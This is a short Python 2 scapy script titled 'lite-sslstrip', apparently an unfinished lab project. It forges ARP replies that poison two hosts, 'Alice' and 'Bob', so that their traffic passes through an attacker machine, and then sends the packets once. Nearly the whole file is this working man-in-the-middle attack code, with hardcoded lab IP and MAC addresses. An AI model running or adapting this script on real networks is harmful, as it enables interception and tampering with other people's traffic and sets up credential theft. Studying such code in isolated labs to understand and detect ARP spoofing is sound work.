# -*- coding: utf-8 -*-

from scapy.all import *

print "Start lite-sslstrip"

# TODO request addresses instead of hardcoding
macAttacker = "08:00:27:32:f4:6a"
ipAttacker = "192.168.56.103"

macAlice = "08:00:27:b0:a1:ab"
ipAlice = "192.168.56.101"

macBob = "08:00:27:C6:A4:61"
ipBob = "192.168.56.102"


# create ARP poison of Alices machine
arpA = Ether() / ARP()
arpA[Ether].src = macAttacker
arpA[ARP].hwsrc = macAttacker
arpA[ARP].psrc = ipBob
arpA[ARP].hwdst = macAlice
arpA[ARP].pdst = ipAlice

print "ARP poison packets Alice generated"

# create ARP poison of Bobs machine
arpB = Ether() / ARP()
arpB[Ether].src = macAttacker
arpB[ARP].hwsrc = macAttacker
arpB[ARP].psrc = ipAlice
arpB[ARP].hwdst = macBob
arpB[ARP].pdst = ipBob

print "ARP poison packets Bob generated"


# send out the arp poisoning every 60 seconds
print "Start ARP-poisoning"
arps = [arpA, arpB]
sendp(arps)

print "Test git"